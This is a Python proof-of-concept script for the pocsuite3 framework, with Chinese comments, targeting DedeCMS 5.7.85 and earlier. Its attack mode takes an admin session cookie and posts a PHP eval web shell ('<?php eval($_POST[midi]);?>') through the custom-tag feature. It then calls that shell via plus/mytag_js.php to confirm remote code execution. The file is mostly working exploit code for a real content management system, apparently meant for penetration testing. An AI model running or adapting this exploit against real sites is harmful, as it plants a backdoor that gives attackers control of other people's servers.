from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder

import re


class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2022-1-12'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-2-13'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-2-13'  # PoC 更新日期 (%Y-%m-%d)
    references = ["https://www.dedecms.com/download"]  # 漏洞来源地址，0day 不用写
    name = 'dedecms 5.7.85 后台getshell'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.dedecms.com'  # 漏洞厂商主页地址
    appName = 'dedecms'  # 漏洞应用名称
    appVersion = '<=5.7.85'  # 漏洞影响版本
    vulType = 'Local File Inclusion'  # 漏洞类型，参见漏洞类型规范表
    desc = 'plus/ad_js.php和plus/mytag_js.php存在过滤不足，由于自定义缓存文件可配合文件包含getshell'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''使用attack时，需要提供后台的用户的cookie。
                usage: pocsuite -u http://localhost -r pocs/dedecms_admin_getshell.py --c PHPSESSID=psqd0328o9tf73rnljkiofqs21
                attack: pocsuite -u http://localhost -r pocs/dedecms_admin_getshell.py --c PHPSESSID=psqd0328o9tf73rnljkiofqs21 --attack
                '''

    def _options(self):
        o = OrderedDict()
        o["c"] = OptString('', description='cookie', require=True)
        return o

    def _verify(self):
        cookie = self.get_option("c")
        result = {}
        headers = {
            "Cookie": "{}".format(cookie)
        }
        filename = random_str(6) + ".php"
        datas  = {
            "dopost": "save",
            "typeid": "0",
            "tagname": "{}".format(filename),
            "timeset": "0",
            "starttime": "2022 - 02 - 13 23: 20:58",
            "endtime": "2099 - 03 - 31 23: 20",
            "normbody": '<?php echo "happy day";?>',
            "expbody": '<?php echo "happy day";?>',
            "imageField.x": "22",
            "imageField.y": "14"
        }
        s = requests.session()
        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/dede/mytag_add.php"
        resp = s.get(self.url + payload2, headers=headers)
        if resp.status_code == 200 and "自定义标记管理" in resp.text:
            resp2 = s.post(self.url + "/dede/mytag_add.php", data=datas, headers=headers)
            if resp2 and resp2.status_code == 200 and filename in s.get(self.url + "/dede/mytag_main.php", headers=headers).text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Referer'] = payload2
            else:
                print("Cookie错误或者已失效")
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        cookie = self.get_option("c")
        result = {}
        s = requests.session()
        # payload 1
        filename = random_str(6) + ".php"
        datas  = {
            "dopost": "save",
            "typeid": "0",
            "tagname": "{}".format(filename),
            "timeset": "0",
            "starttime": "2022 - 02 - 13 23: 20:58",
            "endtime": "2099 - 03 - 31 23: 20",
            "normbody": '<?php eval($_POST[midi]);?>',
            "expbody": '<?php eval($_POST[midi]);?>',
            "imageField.x": "22",
            "imageField.y": "14"
        }
        headers = {"Cookie": "{}".format(cookie)}
        resp1 = s.post(self.url + "/dede/mytag_add.php", data=datas, headers=headers)
        if "成功增加一个自定义标记" in resp1.text:
            resp2 = s.get(self.url + "/dede/mytag_main.php", headers=headers)
            rex_ = "(.*?)<td>(.*?)</td>(.*?)\n(.*?){}(.*?)".format(filename)
            res = re.search(rex_, str(resp2.text))
            try:
                arcID = res.group(2)
            except:
                arcID = 1

            if res and s.get(self.url + "/plus/mytag_js.php?arcID={}&nocache=1".format(arcID), headers=headers):
                shell_resp = s.post(url=self.url + "/plus/mytag_js.php?arcID={}".format(arcID), data={"midi": "echo 'happy day';"}).text
                if "happy day" in shell_resp:
                    result['ShellInfo'] = {}
                    result['ShellInfo']['URL'] = self.url + "/plus/mytag_js.php?arcID={}".format(arcID)
                    result['ShellInfo']['Content'] = '<?php eval($_POST[midi]);?>'
        else:
            print("Cookie错误或者已失效")

        return self.parse_output(result)

register_poc(DemoPOC)